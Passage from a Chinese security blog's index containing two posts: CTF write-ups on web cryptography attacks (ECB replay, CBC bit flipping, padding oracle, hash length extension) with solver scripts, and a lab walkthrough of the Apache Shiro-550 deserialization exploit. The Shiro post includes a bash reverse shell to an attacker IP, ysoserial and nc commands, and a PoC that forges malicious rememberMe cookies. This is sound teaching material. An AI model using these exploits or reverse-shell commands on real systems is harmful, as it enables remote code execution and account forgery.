会话管理","categories":[],"tags":[]},{"title":"常见的-WEB-密码学攻击","slug":"常见的-WEB-密码学攻击","date":"2021-02-19T16:15:53.000Z","updated":"2021-02-24T09:56:19.099Z","comments":true,"path":"article/10fa8c14.html","link":"","permalink":"https://blog.cfyqy.com/article/10fa8c14.html","excerpt":"常见的 WEB 密码学攻击","text":"常见的 WEB 密码学攻击 ECBECB模式的全称是Electronic CodeBook模式，将明文分组加密后直接成为密文分组，而密文则是由密文分组直接拼接而成。 因为每个分组都独自进行加密解密，所以无需破解密文就能操纵部分明文，或者改变明文，在不知道加密算法的情况下得到密文，从而达到攻击效果，如图所示（翻转密文分组，那么明文分组也会被翻转） 例题1：某个 CTF 题目： ecb.php 源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?php//php7function AES($data)&#123; $privateKey = \"12345678123456781234567812345678\"; $encrypted=openssl_encrypt($data,'AES-128-ECB',$privateKey,OPENSSL_RAW_DATA); #$encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $privateKey, $data, MCRYPT_MODE_ECB); $encryptedData = (base64_encode($encrypted)); return $encryptedData;&#125;function DE__AES($data)&#123; $privateKey = \"12345678123456781234567812345678\"; $encryptedData = base64_decode($data); $decrypted=openssl_decrypt($encryptedData,'AES-128-ECB',$privateKey,OPENSSL_RAW_DATA); $decrypted = rtrim($decrypted, \"\") ; return $decrypted;&#125;if (@$_GET['a']=='reg')&#123; setcookie('uid', AES('9')); setcookie('username', AES($_POST['username'])); header(\"Location: http://127.0.0.1/ecb.php\"); exit();&#125;if (@!isset($_COOKIE['uid'])||@!isset($_COOKIE['username']))&#123; echo '&lt;form method=\"post\" action=\"ecb.php?a=reg\"&gt;Username:&lt;br&gt;&lt;input type=\"text\" name=\"username\"&gt;&lt;br&gt;Password:&lt;br&gt;&lt;input type=\"text\" name=\"password\" &gt;&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" value=\"注册\"&gt;&lt;/form&gt; ';&#125;else&#123; $uid = DE__AES($_COOKIE['uid']); if ( $uid != 4)&#123; echo 'uid:' .$uid .'&lt;br/&gt;'; echo 'Hi ' . DE__AES($_COOKIE['username']) .'&lt;br/&gt;'; echo 'You are not administrotor!!'; &#125; else &#123; echo \"Hi you are administrotor!!\" .'&lt;br/&gt;'; echo 'Flag is flag&#123;this is flag&#125;'; &#125;&#125;?&gt; 解题思路：以administrator权限登陆就就能获得Flag。判断权限则是根据cookie里面的uid参数，cookie包含username和uid两个参数，均为使用ECB加密的密文，然而username的密文是根据注册时的明文生成的 因此我们可以根据username的明文操纵生成我们想要的uid的密文。经过fuzz发现明文分组块为16个字节，那么我们注册17字节的用户，多出的那一个字节就可以是我们我们希望的UID的值，而此时我们查看username的密文增加部分就是UID的密文，即可伪造UID。 注册aaaaaaaaaaaaaaaa1获得1的密文分组,注册aaaaaaaaaaaaaaaa2获得2的密文分组，以此类推payload 123456789101112131415161718192021222324252627282930313233343536//python2import urllibimport urllib2import base64import cookielibimport Cookiefor num in range(1,50): reg_url='http://127.0.0.1/ecb.php?a=reg' index_url='http://127.0.0.1/ecb.php' cookie=cookielib.CookieJar() opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie)) opener.addheaders.append(('User-Agent','Mozilla/5.0')) num=str(num) values=&#123;'username':'aaaaaaaaaaaaaaaa'+num,'password':'123'&#125; data=urllib.urlencode(values) opener.open(reg_url,data) text=opener.open(index_url,data) for ck in cookie: if ck.name=='username': user_name=ck.value user_name = urllib.unquote(user_name) user_name = base64.b64decode(user_name) hex_name = user_name.encode('hex') hex_name = hex_name[len(hex_name)/2:] hex_name = hex_name.decode('hex') uid = base64.b64encode(hex_name) uid = urllib.quote(uid) for ck in cookie: if ck.name=='uid': ck.value=uid text=opener.open(index_url).read() if 'Flag' in text: print text break else: print num 例题2：startCTF 2021 lottery againecb模式，按块加密，每块密钥相同，密文按块直接与明文对应，所以我们可以控制明密文对重放攻击。 对于一个enc，长106字节，如下 1&#123;\"lottery\":\"48e51545-cfd3-4d2e-8ea4-851c945b5faf\",\"user\":\"0123ff93-c230-49b9-b078-5d205247c5a8\",\"coin\":81&#125; 本题使用的是MCRYPT_RIJNDAEL_256加密，rijndael128与aes相同，都是以128位为一个块加密，rijndael256则是以256位为一个块，即32字节。 思路就是通过重放，将多个彩票不同块进行拼接，使得同一个user可以对应多个lottery。 因为每块是32字节对应切割位点如下： 1&#123;\"lottery\":\"48e51545-cfd3-4d2e-8|ea4-851c945b5faf\",\"user\":\"0123ff|93-c230-49b9-b078-5d205247c5a8\",|\"coin\":81&#125; 最后一块不足32字节自动填充。 可以看到我们无论替换哪一个块都不能完整控制lottery或者user，替换前两块的成功的前提是另一个enc的user前6字节也是0123ff，碰撞概率较小。 但是我们可以将第一个enc的前1，2块拼接上第二个enc的2，3，4块，形成如下类似的格式 1&#123;\"lottery\":\"48e51545-cfd3-4d2e-8ea4-851c945b5faf\",\"user\":\"0123ffb0e-b15c9de5afaa\",\"user\":\"8dfd276a-ee65-4563-af33-c1ae7c577322\",\"coin\":88&#125; 当json_decode之后后面的user会覆盖前面的，就成功控制user不变，lottery一直在变了。 脚本如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import requestsimport randomimport stringimport jsonimport base64from urllib.parse import quoteuser_token = \"1slT9Xb1TxoDtEtxKZ2k0n8c9T3lZttY\"user_uuid = \"fadf5f40-9fe1-4a57-8d5b-06f16584298b\"user_enc = b\"8mKK4YdL0VHw67+rtMCBv+z9SX4yB7SwYWlL2A3VPqXXFHIpf1XGIVDHNxW5td/3fyYbEEEBv43419eYjQAwd9thL1nc+6OWy2UDfXdG+INLgbXDkV8kaRNGurSbXtf5XUzAgdeXmksz508IscL5BqiGkpqPuH/4Qa5qAiM0/hU=\"cookie = &#123; \"api_token\": user_token&#125;url = \"http://52.149.144.45:8080\"def get_random(): return ''.join(random.sample(string.ascii_letters + string.digits, 10))def register(): username=get_random() data= &#123; \"username\": username, \"password\": \"asdasd\" &#125; res = requests.post(url + \"/user/register\",data=data) d = json.loads(res.text) return usernamedef login(username, password=\"asdasd\"): data = &#123; \"username\": username, \"password\": password &#125; res = requests.post(url + \"/user/login\",data=data) d = json.loads(res.text) return d['user']['api_token']def info(api_token): res = requests.get(url + \"/user/info?api_token=\" + api_token) d = json.loads(res.text) print('uuid: '+d['user']['uuid'])def buy(api_key): data = &#123; \"api_token\": api_key &#125; res = requests.post(url + \"/lottery/buy\",data=data) #print(res.text) d = json.loads(res.text) return d['enc']def get_enc(enc): o = base64.b64decode(enc) u = base64.b64decode(user_enc) m = base64.b64encode(o[:64] + u[32:]) print('enc: ', end='') print(quote(m)) return mdef charge(enc): data = &#123; \"user\": user_uuid, \"enc\": enc, \"coin\": \"7\" &#125; res = requests.post(url + \"/lottery/charge\", data=data, cookies=cookie) print(\"charge: \", end='') print(res.content)if __name__ == \"__main__\": while True: username = register() api_token = login(username) enc = buy(api_token) info(api_token) mo_enc = get_enc(enc) charge(mo_enc) CBC字节翻转因为CBC模式是将前一个密文分组和明文分组进行混合加密所以，是可以避免ECB模式的弱点。 但正因为如此，导致了解密时修改前一个密文分组就可以操纵后一个的解密后的明文分组，可以将前一个密文中的任意比特进行修改（0,1进行互换，也可以叫翻转） 因此CBC模式有两个攻击点： ①iv向量，影响第一个明文分组 ②第n个密文分组，影响第n+1个明文分组 密文通过block cipher encryption解密，得到中间密文，中间密文与IV(前一个密文区块)异或后得到的是明文，因此可以通过攻击IV，来改变最终的明文。 12345678910111213141516条件：中间密文 ^ 原先IV = 原始明文假设：伪造IV = 原始IV ^ 原始明文 ^ 伪造明文此时： 中间密文 ^ 伪造IV=原始IV ^ 原始明文 ^ 伪造IV =原始IV ^ 原始明文^原始IV ^ 原始明文 ^ 伪造明文=伪造明文所以：中间密文 ^ 伪造IV = 伪造明文通过篡改IV，来改变密文解密之后的明文举例：密文1[4]的意思是密文1字符串第4个字节，相当于数组下标。设：密文1[4] = A，解密(密文2)[4] = B，明文2[4] = C因为A ^ B = C，根据结论有B = A ^ C当人为修改A=A ^ C时，那么A ^ B = A ^ C ^ B = B ^ B = 0，这样明文2[4]的结果就为0了当人为修改A=A ^ C ^ x (x为任意数值)时，那么A ^ B = A ^ C ^ x ^ B = B ^ B ^ x = x，这是明文2[4] = x，这样就达到了控制明文某个字节的目的了。 例题1：flag.php 12345// flag.php&lt;?php$key = \"8bd54bcfe6a23fc0\";$flag = \"flag&#123;admin_or_guest&#125;\";?&gt; cbc.php 1234567891011121314151617181920212223242526272829303132333435&lt;?phperror_reporting(0);include(\"flag.php\");$iv = 'NGY0MWVlOGE2MGU4NTkxMQ==';function decode($str,$key,$iv)&#123; return openssl_decrypt(base64_decode($str),\"AES-128-CBC\",$key,OPENSSL_RAW_DATA,base64_decode($iv));&#125;function encode($str,$key,$iv)&#123; return base64_encode(openssl_encrypt($str,\"AES-128-CBC\",$key,OPENSSL_RAW_DATA, base64_decode($iv)));&#125;if(isset($_COOKIE['username']) &amp;&amp; isset($_COOKIE['iv']))&#123; if(decode($_COOKIE['username'],$key,$_COOKIE['iv']) === \"admin\")&#123; echo \"hello admin&lt;br&gt;\"; echo $flag.\"&lt;br&gt;\"; &#125; else if(decode($_COOKIE['username'],$key,$_COOKIE['iv']) === \"guest\")&#123; echo \"hello guest&lt;br&gt;\"; &#125; else &#123; echo \"iv or username error\"; &#125;&#125;else&#123; $enc = encode(\"guest\",$key,$iv); setcookie('username',$enc); setcookie('iv',$iv);&#125;highlight_file(__file__);?&gt; 可以知道代码解密得到的用户名为 admin 时，会得到flag。 所以可以利用CBC字节翻转攻击，将密文解密成任意明文。 123456789import base64iv = base64.b64decode('NGY0MWVlOGE2MGU4NTkxMQ==')admin = 'admin' + '\\x0b'*11guest = 'guest' + '\\x0b'*11new_iv = ''for i in range(len(admin)): new_iv += chr(ord(iv[i]) ^ ord(admin[i]) ^ ord(guest[i]))print base64.b64encode(new_iv)# Mnc8K39lOGE2MGU4NTkxMQ== 例题2：Bugku 的 web39 CBC字节翻转攻击 存在.index.php.swp ,vim -r .index.php.swp 恢复得源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;&lt;title&gt;Login Form&lt;/title&gt;&lt;link href=\"static/css/style.css\" rel=\"stylesheet\" type=\"text/css\" /&gt;&lt;script type=\"text/javascript\" src=\"static/js/jquery.min.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt;$(document).ready(function() &#123; $(\".username\").focus(function() &#123; $(\".user-icon\").css(\"left\",\"-48px\"); &#125;); $(\".username\").blur(function() &#123; $(\".user-icon\").css(\"left\",\"0px\"); &#125;); $(\".password\").focus(function() &#123; $(\".pass-icon\").css(\"left\",\"-48px\"); &#125;); $(\".password\").blur(function() &#123; $(\".pass-icon\").css(\"left\",\"0px\"); &#125;);&#125;);&lt;/script&gt;&lt;/head&gt;&lt;?phpdefine(\"SECRET_KEY\", file_get_contents('/root/key'));define(\"METHOD\", \"aes-128-cbc\");session_start();function get_random_iv()&#123; $random_iv=''; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie(\"iv\", base64_encode($iv)); setcookie(\"cipher\", base64_encode($cipher));&#125;function check_login()&#123; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE[\"iv\"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die(\"&lt;p&gt;base64_decode('\".base64_encode($plain).\"') can't unserialize&lt;/p&gt;\"); $_SESSION['username'] = $info['username']; &#125;else&#123; die(\"ERROR!\"); &#125; &#125;&#125;function show_homepage()&#123; if ($_SESSION[\"username\"]==='admin')&#123; echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; &#125;else&#123; echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; &#125; echo '&lt;p&gt;&lt;a href=\"loginout.php\"&gt;Log out&lt;/a&gt;&lt;/p&gt;';&#125;if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; if($username === 'admin')&#123; exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); &#125;else&#123; $info = array('username'=&gt;$username,'password'=&gt;$password); login($info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION[\"username\"]))&#123; check_login(); show_homepage(); &#125;else&#123; echo '&lt;body class=\"login-body\"&gt; &lt;div id=\"wrapper\"&gt; &lt;div class=\"user-icon\"&gt;&lt;/div&gt; &lt;div class=\"pass-icon\"&gt;&lt;/div&gt; &lt;form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\"&gt; &lt;div class=\"header\"&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class=\"content\"&gt; &lt;input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" /&gt; &lt;input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" /&gt; &lt;/div&gt; &lt;div class=\"footer\"&gt; &lt;input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; &#125;&#125;?&gt;&lt;/html&gt; 解题得cipher 12345678910111213141516171819&lt;?php #计算cipher /* 明文1：a:2:&#123;s:8:\"userna //r 明文2：me\";s:5:\"admiy\"; //l字母在第14个字节 明文3：s:8:\"password\";s 明文4：:6:\"passwd\";&#125; */ $cipher = base64_decode(urldecode('6HJUuK%2BgTYFjGKKdQKrvqG4lQyZNT3A7kl42ipzlqI7M%2BoSGPbRgihwSFPqmfVY2ScFMSuJpCsOgRbTp%2Bpn94Q%3D%3D')); $temp = $cipher; /* 设密文1[13]=A, 解密(密文2)[13]=B, 明文2[13]=C, 将A修改为A ^ C,则: A ^ B = A ^ C ^ B = B ^ B = 0 = C */ // A C X $cipher[13] = chr(ord($cipher[13]) ^ ord('y') ^ ord('n')); echo urlencode(base64_encode($cipher));?&gt; 得iv 1234567891011&lt;?php #计算iv $res = base64_decode('RWn5qVqquwKuATc4kqaobG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6InBhc3N3ZCI7fQ=='); //这里放burp放回的base64数据 $iv = base64_decode(urldecode('Yfz1VNAk9RvNa09MCezJRA%3D%3D')); //这里放cookie中的iv $plaintext = 'a:2:&#123;s:8:\"userna'; $new_iv = ''; for ($i = 0; $i &lt; 16; $i ++)&#123; $new_iv = $new_iv . chr(ord($iv[$i]) ^ ord($res[$i]) ^ ord($plaintext[$i])); &#125; echo urlencode(base64_encode($new_iv));?&gt; Padding oracle分组密码Block Cipher需要在加载前确保每个每组的长度都是分组长度的整数倍。一般情况下，明文的最后一个分组很有可能会出现长度不足分组的长度:这个时候，普遍的做法是PKCS#5标准中定义的规则，在最后一个分组后填充一个固定的值，这个值的大小为填充的字节总数。即假如最后还差3个字符，则填充3个0×03因为填充发生在最后一个分组，所以我们主要关注最后一个分组这里有个条件是服务器会对我们显示padding error的异常，如果不回显那么肯定无法判断进行利用 比如在web应用中，如果Padding不正确，则应用程序很可能会返回500的错误(程序执行错误)；如果Padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误(这只是业务上的规定)，所以，这种区别就可以成为一个二值逻辑的”注入点”。 攻击成立的两个重要假设前提: 121. 攻击者能够获得密文（Ciphertext），以及附带在密文前面的IV（初始化向量）2. 攻击者能够触发密文的解密过程，且能够知道密文的解密结果 HASHHASH原理首先，当hash函数拿到需要被hash的字符串后，先将其字节长度整除64，取得余数。如果该余数正好等于56，那么就在该字符串最后添加上8个字节的长度描述符（具体用bit表示）。如果不等于56，就先对字符串进行长度填充，填充时第一个字节为hex(80)，其他字节均用hex(00)填充，填充至余数为56后，同样增加8个字节的长度描述符（该长度描述符为需要被hash的字符串的长度，不是填充之后整个字符串的长度）。以上过程，称之为补位。 补位完成后，字符串以64位一组进行分组。字符串能被分成几组就会进行多少次“复杂的数学变化”。每次进行“复杂的数学变化”都会生成一组新的registers值供下一次“复杂的数学变化”来调用。第一次“复杂的数学变化”会调用程序中的默认值。当后面已经没有分组可以进行数学变化时，该组生成的registers值就是最后的hash值。 为确保同一个字符串的hash值唯一，所以需要保证第一次registers的值也唯一。所以在hash算法中，registers具有初始值。如上图中的registers值0。 MD5算法实现我们要实现对于字符串abc的 md5 的值计算。首先我们要把其转化为 16 进制。 补位（1byte=8bit）消息必须进行补位，即使得其长度在对 512 取模后的值为 448。也就是说，len(message) % 512 == 448。当消息长度不满 448 bit 时（注意是位，而不是字符串长度），消息长度达到 448 bit 即可。当然，如果消息长度已经达到 448 bit，也要进行补位。补位是必须的。补位的方式的二进制表示是在消息的后面加上一个1，后面跟着无限个0，直到 len(message) % 512 == 448。在 16 进制下，我们需要在消息后补80，就是 2 进制的10000000。我们把消息abc进行补位到 448 bit，也就是 56 byte。补位过后，第 57 个字节储存的是补位之前的消息长度。abc是 3 个字母，也就是 3 个字节，24 bit。换算成 16 进制为 0x18。其后跟着 7 个字节的 0x00，把消息补满 64 字节。MD5中存储的都是小端方式！重要的事情说三遍，举个例子：假如我们这一块值为0x12345678那么在MD5运算时候存储的顺序是 0x78563412这也是之所以后8字节为长度，而第1字节先有数据的原因 计算消息摘要计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512 bit的消息（即64字节）。 计算消息摘要的时候，有一个初始的链变量，用来参与第一轮的运算。MD5 的初始链变量为： 1234A=0x67452301B=0xefcdab89C=0x98badcfeD=0x10325476 上面的链变量将会被新的值覆盖。之后有四个非线性函数，将字符串和那四个链接变量经过一系列的复杂运算，算出一组新的A,B,C,D的值，如果消息小于512，也就是只需要计算一次，这时候将新的ABCD的值按ABCD的顺序级联，然后输出，就是MD5的值，如果消息大于512的话，就需要计算多次，先计算出前512位的ABCD值然后用再用这个ABCD去计算后面512位的ABCD值以此类推，最后计算出来的ABCD经过拼接就是这串字符串的MD5值。 哈希长度扩展攻击 Hash-Length-Extension-Attack ，可以在知道MD5(message)的hash值得情况下，算出MD5(message+padding+a)的hash值，就是根据短的消息的hash算出更长的消息的hash。 所需条件： 知道Salt的长度 要知道一个由salt加密后的md5值 知道$data的值(未加盐的明文) 例题1：ISCC2018 的一道题目secret.php 1234&lt;?php$key='123456789qwertyuiopasdfghjklzxcvbnm12345671475';$flag='flag&#123;this_1s_a_f1ag&#125;';?&gt; hash.php 1234567891011121314151617181920&lt;?phpinclude \"secret.php\";@$username=(string)$_POST['username'];function enc($text)&#123; global $key; return md5($key.$text);&#125;if(enc($username) === $_COOKIE['verify'])&#123; if(is_numeric(strpos($username, \"admin\")))&#123; die($flag); &#125; else&#123; die(\"you are not admin\"); &#125;&#125;else&#123; setcookie(\"verify\", enc(\"guest\"), time()+60*60*24*7); setcookie(\"len\", strlen($key), time()+60*60*24*7);&#125;show_source(__FILE__); 解题从源码可以得到以下内容: 12enc(&quot;guest&quot;)的值 $key的长度为46 这段代码要求我们输入的username在经过enc函数加密之后，与$_COOKIE[‘verify’]的值相等，并且username中必须含有admin 使用hashdump工具 12345git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmakemake install 1234Input Signature: 已知的hash值，这里是$_COOKIE['verify']的值Input Data: 上面的hash值解密后的字符串，这里是guest。Input Key Length: $key的长度Input Data to Add: 想要添加的数据，由于题目要求要含有admin，所以这里是admin。 然后我们将得到的hash值去替换数据包中$_COOKIE[‘verify’]的值，然后post提交username=guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin即可。 例题2：jarvis oj 的web题 flag在管理员手中吗?index.php~泄露得源码 123456789101112131415161718192021222324&lt;?php $auth = false; $role = \"guest\"; $salt = if (isset($_COOKIE[\"role\"])) &#123; $role = unserialize($_COOKIE[\"role\"]); $hsh = $_COOKIE[\"hsh\"]; if ($role===\"admin\" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[\"role\"]))) &#123; $auth = true; &#125; else &#123; $auth = false; &#125; &#125; else &#123; $s = serialize($role); setcookie('role',$s); $hsh = md5($salt.strrev($s)); setcookie('hsh',$hsh); &#125; if ($auth) &#123; echo \"&lt;h3&gt;Welcome Admin. Your flag is &#125; else &#123; echo \"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;\"; &#125; ?&gt; 安装hash_extender步骤: 123git clone https://github.com/iagox86/hash_extender cd hash_extender make 然后python脚本如下: 123456789101112131415161718192021222324252627282930313233343536373839# -*- coding:utf-8 -*-from urlparse import urlparsefrom httplib import HTTPConnectionfrom urllib import urlencodeimport jsonimport timeimport osimport urllibdef gao(x, y): #print x #print y url = \"http://web.jarvisoj.com:32778/index.php\" cookie = \"role=\" + x + \"; hsh=\" + y #print cookie build_header = &#123; 'Cookie': cookie, 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0', 'Host': 'web.jarvisoj.com:32778', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', &#125; urlparts = urlparse(url) conn = HTTPConnection(urlparts.hostname, urlparts.port or 80) conn.request(\"GET\", urlparts.path, '', build_header) resp = conn.getresponse() body = resp.read() return bodyfor i in xrange(1000): print i # secret len = ??? find_hash = \"./hash_extender -d ';\\\"tseug\\\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5 -a ';\\\"nimda\\\":5:s' --out-data-format=html -l \" + str(i) + \" --quiet\" #print find_hash calc_res = os.popen(find_hash).readlines() hash_value = calc_res[0][:32] attack_padding = calc_res[0][32:] attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1]) ret = gao(attack_padding, hash_value) if \"Welcome\" in ret: print ret break 注意这个脚本在hash_extender目录下使用 然后得到回显: 12345678910111213141516171819202122232425262728290123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Web 350&lt;/title&gt;&lt;style type=\"text/css\"&gt; body &#123; background:gray; text-align:center; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;Welcome Admin. Your flag is PCTF&#123;H45h_ext3ndeR_i5_easy_to_us3&#125; &lt;/h3&gt;&lt;/body&gt;&lt;/html&gt; 参考文章：常见的Web密码学攻击方式汇总：https://www.anquanke.com/post/id/84724Padding Oracle 和 CBC字节翻转攻击学习：https://www.cnblogs.com/tr1ple/p/11114958.html*CTF 2021 WriteUp By 星盟ctf战队CBC字节翻转攻击: http://www.lmxspace.com/2018/05/07/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/CBC字节翻转攻击:https://sec-in.com/article/274Padding Oracle 和 CBC字节翻转攻击学习: https://www.cnblogs.com/tr1ple/p/11114958.htmlPadding Oracle Attack: http://www.helix.cool/2020/05/18/Padding-Oracle-Attack/我对Padding Oracle攻击的分析和思考（详细）：https://www.freebuf.com/articles/web/15504.htmlAutomated Padding Oracle Attacks With PadBuster：https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.htmlUnderstanding MD5 Length Extension Attack:http://blog.chinaunix.net/uid-27070210-id-3255947.htmlMD5哈希(hash)长度扩展攻击:https://ntwyc2018.github.io/2018/07/10/md5%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/Hash长度扩展攻击：https://www.smi1e.top/hello-world/","categories":[],"tags":[]},{"title":"shrio漏洞分析","slug":"shrio漏洞学习","date":"2021-02-17T13:56:50.000Z","updated":"2021-03-03T01:27:16.913Z","comments":true,"path":"article/bb150e8a.html","link":"","permalink":"https://blog.cfyqy.com/article/bb150e8a.html","excerpt":"Shrio漏洞学习","text":"Shrio漏洞学习 Shrio反序列化命令执行（Shiro-550 CVE-2016-4437）影响范围：shiro &lt;= 1.2.4 存在反序列化漏洞 漏洞缘由：Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时： 检索RememberMe Cookie的值 Base 64解码 AES解密（加密密钥硬编码） 进行反序列化操作（未过滤处理） 攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令 漏洞影响：只要rememberMe的AES加密密钥泄漏，无论shiro什么版本都会导致反序列化漏洞。 漏洞搭建：https://github.com/Medicean/VulApps/tree/master/s/shiro/1拉取镜像到本地 1$ docker pull medicean/vulapps:s_shiro_1 启动环境 1$ docker run -d -p 8081:8080 medicean/vulapps:s_shiro_1 访问8081端口 漏洞利用相关环境：靶机：192.168.247.130攻击机：192.168.247.129 使用Shiro_exploit工具，检查是否存在默认的key。 Github项目地址： https://github.com/insightglacier/Shiro_exploit 1python shiro_exploit.py -u http://192.168.247.130:8081/ 存在默认key： CipherKey:kPH+bIxk5D2deZiIxcaaaA== 利用方式一：反弹shell 制作反弹shell 代码使用http://www.jackson-t.ca/runtime-exec-payloads.html 进行编码 1bash -I &gt;&amp; /dev/tcp 192.168.247.129/1234 0&gt;&amp;1 使用 ysoserial 中 JRMP 监听模块，监听6666端口ysoserial 地址: https://github.com/frohoff/ysoserial攻击机中执行命令： 1java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0Ny4xMjkvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;' 监听反弹端口 1234攻击机中执行命令： 1nc -lvnp 1234 生成 POCshrio.py 12345678910111213141516171819import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command): popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(\"kPH+bIxk5D2deZiIxcaaaA==\") iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == '__main__': payload = encode_rememberme(sys.argv[1]) print(\"rememberMe=&#123;0&#125;\".format(payload.decode())) shrio.py 和 ysoserial.jar 放在同一目录下，攻击机中执行如下命令 1python3 shiro.py 192.168.247.129:6666 得到rememberMe抓取登录后的数据包,修改 cookie的 rememberMe 。反弹成功 利用方式二：写入shell生成poc.ser 1java -jar ysoserial.jar CommonsBeanutils1 \"echo 'this a test' &gt; /tmp/shell\" &gt; poc.ser 代码 123456789101112131415161718192021import org.apache.shiro.crypto.AesCipherService;import org.apache.shiro.codec.CodecSupport;import org.apache.shiro.util.ByteSource;import org.apache.shiro.codec.Base64;import org.apache.shiro.io.DefaultSerializer;import java.nio.file.FileSystems;import java.nio.file.Files;import java.nio.file.Paths;public class TestRemember &#123; public static void main(String[] args) throws Exception &#123; byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(\"d://poc.ser\")); AesCipherService aes = new AesCipherService(); byte[] key = Base64.decode(CodecSupport.toBytes(\"kPH+bIxk5D2deZiIxcaaaA==\")); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); &#125;&#125; 这里没尝试成功 漏洞分析环境搭建 1234567//jdk1.6版本 window jdk版本切换：w //maven 3.2.5 maven历史版本下载 https://blog.csdn.net/still_ly/article/details/80905149//tomcat 7git clone https://github.com/apache/shiro.git git checkout shiro-root-1.2.4 cd ./shiro/samples/web mvn package -D maven.skip.test=true 在.m2目录下创建一个toolchains.xml文件，然后加入jdk 1.6的路径，这个版本的编译依赖jdk1.6 1234567891011121314&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;toolchains xmlns=\"http://maven.apache.org/TOOLCHAINS/1.1.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/TOOLCHAINS/1.1.0 http://maven.apache.org/xsd/toolchains-1.1.0.xsd\"&gt; &lt;toolchain&gt; &lt;type&gt;jdk&lt;/type&gt; &lt;provides&gt; &lt;version&gt;1.6&lt;/version&gt; &lt;vendor&gt;sun&lt;/vendor&gt; &lt;/provides&gt; &lt;configuration&gt; &lt;jdkHome&gt;C:\\Program Files\\Java\\jdk1.6.0_45\\&lt;/jdkHome&gt; &lt;/configuration&gt; &lt;/toolchain&gt;&lt;/toolchains&gt; 